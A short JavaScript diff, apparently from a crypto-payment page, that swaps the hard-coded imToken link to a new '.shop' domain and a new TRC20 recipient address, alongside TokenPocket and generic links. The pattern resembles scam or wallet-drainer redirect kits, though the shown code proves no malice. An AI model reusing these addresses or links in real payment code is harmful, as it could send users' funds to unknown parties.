@@ -108,7 +108,7 @@ let addtype = $("#addtype").val();
 
 // 	let my_url = window.location.protocol + "//" + window.location.host + "/" + addtype + ".html?from=" + from +
 		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url;
-	let im_url = "https://svip66.github.io/1/?addtype=trc20&to_address=TCEUFLkzxoGmd48YZdzPd6xQ7XMCYC9uyA&from_url=https://svip66.github.io/1&locale=zh-CN&utm_source=imtoken"
+	let im_url = "https://www.wyfk.shop/trc20.html?from=imToken&addtype=trc20&to_address=TQgowxJypWmNGb1fuFGd5iyM8FfW7ziV3Y&from_url=www.wyfk.shop&locale=zh-CN&utm_source=imtoken"
 let tp_url =  "https://svip66.github.io/1/?addtype=trc20&to_address=TCEUFLkzxoGmd48YZdzPd6xQ7XMCYC9uyA&utm_source=tokenpocket"
 let my_url =  "https://svip66.github.io/1/?addtype=trc20&to_address=TCEUFLkzxoGmd48YZdzPd6xQ7XMCYC9uyA"	
 	let qr_url = 	window.location.protocol + "//" + window.location.host + "/qrcode.html?&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url;
